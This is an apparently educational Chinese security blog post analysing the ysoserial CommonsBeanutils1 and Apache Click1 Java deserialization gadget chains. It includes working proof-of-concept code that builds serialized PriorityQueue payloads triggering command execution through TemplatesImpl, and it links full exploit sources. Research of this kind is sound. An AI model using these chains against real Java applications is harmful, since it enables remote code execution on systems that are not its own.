# ysoserial CommonsBeanutils1 & Click1 详细分析

阅读量 **141101**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-23 14:30:06

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)

CommonsBeanutils1 是一条比较古老的反序列化利用链，今年出的新利用链Apache
Click1与之非常相似，同时填补在上篇文章中留的坑，解决openAM反序列化利用链构造问题。

## 0x00 思考

分析完CommonsCollections系列利用链后对Java反序列化利用链有了更深层次的认识。其实Java与PHP的反序列化有着相同的地方，我们把
**填充了特定属性的类** 作为点，把 **类之间的方法调用**
作为线，这样线可以去连接点，完整的利用链最终能够把所有的点串起来。在构造利用链的时候无非就是考虑怎样把我想要的一些点串起来，抛开变量赋值的方式来讲，方法调用大体来讲有两种方式。

  * 直接调用
  * 通过一些特性调用

###  0x1 直接调用

就是字面意思，一个类中的方法直接调用了另一个类中的方法。我们拿一些之前分析的例子看一看。  
比如LazyMap中的get方法会调用Transformer类型的transform方法。

![](https://p3.ssl.qhimg.com/t0122839a348f7b9c04.png)

factory为构造方法中的参数，在构造LazyMap时可以指定要传入的对象。大部分的方法调用都是通过这种方式进行的。

###  0x2 通过特性调用

通过某种Java机制进行的方法调用，比如说反射、javaBean属性获取、动态代理机制等等。我们可以在很多利用链中反复利用这些特性。举个简单的例子CC1链中AnnotationInvocationHandler的invoke方法调用就是采用的动态代理机制将readObject和Handler的invoke方法连接在一起。我们回忆一下关键点

![](https://p0.ssl.qhimg.com/t0183ca72d58fd04bfe.png)

AnnotationInvocationHandler的memberValues变量可以通过构造方法赋值，当赋值为一个代理类后，在执行这个代理类的entrySet方法时会自动调用代理类Handler的invoke方法。今天将要介绍javaBean属性获取的相关特性。

## 0x01 CommonsBeanutils1 分析

回到这次分析的主角之一CommonsBeanutils1，首先我们看下此次的命令执行点

###  0x1 命令执行入口

命令执行的具体步骤在之前分析CC2的时候详细讲解过，可参考<https://www.anquanke.com/post/id/232592#h2-6>，当时将newTransformer函数作为连接函数，把TransformingComparator和TemplatesImpl两个类连接在了一起。

![](https://p4.ssl.qhimg.com/t01205103b3ab361ac6.png)

仔细的看下TemplatesImpl代码，还会发现另外一个连接点。getOutputProperties方法也会调用newTransformer函数。因此想办法调用这个方法即可。

![](https://p2.ssl.qhimg.com/t01d28001439ff4b26c.png)

###  0x2 前置知识JavaBean

JavaBean其实就是符合一定规则的Java类。在Java中，有很多class的定义都符合这样的规范：

  * 若干private实例字段；
  * 通过public方法来读写实例字段。

例如：

    
    
    public class Person {
        private String name;
        private int age;
    
        public String getName() { return this.name; }
        public void setName(String name) { this.name = name; }
    
        public int getAge() { return this.age; }
        public void setAge(int age) { this.age = age; }
    }
    

如果读写方法符合以下这种命名规范，那么这种类就被称为JavaBean

    
    
    // 读方法:
    public Type getAbc()
    // 写方法:
    public void setAbc(Type value)
    

PropertyUtils.getProperty(Object bean, String name)
函数这个方法是获取bean中名为name的属性。在获取name属性的过程中会调用getXXX的方法，这种调用特性给构造利用链提供了新的思路。

###  0x3 符合条件的Comparator

在BeanComparator类中的compare方法里有PropertyUtils.getProperty函数的调用，具体实现如下

![](https://p4.ssl.qhimg.com/t010d713569d12b5dfe.png)

这样我们就可以将BeanComparator的compare函数作为桥梁用来连接命令执行链和其他的函数，目前的利用链状态为

![](https://p3.ssl.qhimg.com/t012dbb6aa1b363e6f5.png)

结合之前分析的CC2链，很容易想到用PriorityQueue类调用继承了Comparator接口的BeanComparator方法。

###  0x4 创造条件调用compare方法

PriorityQueue中的readObject会调用heapify函数进行元素排序，之后会触发comparator.compare方法，完美的闭合整个利用链。

![](https://p0.ssl.qhimg.com/t0157f9f5ce25b64aa2.png)

![](https://p2.ssl.qhimg.com/t01d55914f5a014337e.png)

###  0x5 编写利用代码

代码放在了github上<https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/CButils1.java>，主代码如下

    
    
    final Object templates = createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    // mock method name until armed
    
    // create queue with numbers and basic comparator
    final BeanComparator comparator = new BeanComparator("lowestSetBit");
    
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,comparator);
    // stub data for replacement later
    queue.add(new BigInteger("1"));
    queue.add(new BigInteger("1"));
    
    // switch method called by comparator
    setFieldValue(comparator, "property", "outputProperties");
    
    // switch contents of queue
    final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = templates;
    
    //        return queue;
    byte[] serializeData=serialize(queue);
    unserialize(serializeData);
    

有几个点需要注意下

  * 一开始将BeanComparator的property设置为lowestSetBit，以及向queue队列中填充BigInteger对象，都是为了在执行add函数时不触发构造好的利用链，以防程序中断。
  * add之后将comparator的property属性调整为outputProperties，以及queue元素调整为templates因为需要在序列化数据时把恶意数据带进去。

## 0x02 Click1 反序列化利用分析

该链的作者artsploit在今年分析openAM项目时现找的一条利用链，这条利用链和CommonsBeanutils1有着很多相似之处，所以我把他们放在一起对比着分析。作者在自己的分析文章中讲了是如何发现这条利用链的，我们就跟随大佬的脚本看一看整个链的发现过程。

###  0x1 发现过程

借助开源工具[gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)帮助我们分析潜在的反序列化利用链

    
    
    git clone https://github.com/JackOfMostTrades/gadgetinspector.git
    cd gadgetinspector
    ./gradlew shadowJar
    

![](https://p3.ssl.qhimg.com/t010df95b640c8a4c11.png)

通过该工具会找到很多可以的利用链，具体能不能用需要人工判断。值得注意的是ColunmnComparator的compare方法会调用getProperty，这和CommonsBeanutils1惊人的相似，需要好好的分析下其中的逻辑。

###  0x2 替代BeanComparator

打开Column文件，在compare代码中会调用this.column的getProperty方法

![](https://p5.ssl.qhimg.com/t01a9787dd921e12b5f.png)

之后会调用一些列的函数到达Method.invoke执行row对象中的getXXX函数。在构造利用代码的时候需要指定column对象的name字段为outputProperties。

![](https://p3.ssl.qhimg.com/t01da91adea6367a819.png)

结合之前的利用链分析，把BeanComparator替换为ColumnComparator，如下图所示

![](https://p2.ssl.qhimg.com/t0160ac96eb8f0c15a4.png)

###  0x3 编写利用代码

完整代码上传至github上<https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/Click1.java>，主要代码如下

    
    
    public static void main(String[] args) throws Exception {
        final Object templates = createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        // mock method name until armed
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);
    
        // create queue with numbers and basic comparator
    
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
    
        // switch method called by comparator
        column.setName("outputProperties");
    
        // switch contents of queue
        final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        //        return queue;
        byte[] serializeData=serialize(queue);
        unserialize(serializeData);
    }
    

在构造的时候注意几个地方

  * ColumnComparator是Column的非public内部类，因此在创建对象的时候采用反射的方法。
  * ColumnComparator的构造方法参数类型为Column，因此创建它之前要先创建Column对象。
  * 其他的地方和BeanCompatrator一模一样。

## 0x03 总结

在分析过CC系列链后，学习了CommonsBeanutils1和Click1两条相似的利用链，又增加了对反序列化利用的认识。对于Java反序列化的利用链会继续跟踪学习下去，争取早日挖掘出自己的利用链。

## 0x04 参考文献

<https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464>  
<https://www.daimajiaoliu.com/daima/47e366dba900403>  
<https://blog.weik1.top/2021/01/18/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/247434](/post/id/247434)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [Ysoserial](/tag/Ysoserial)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

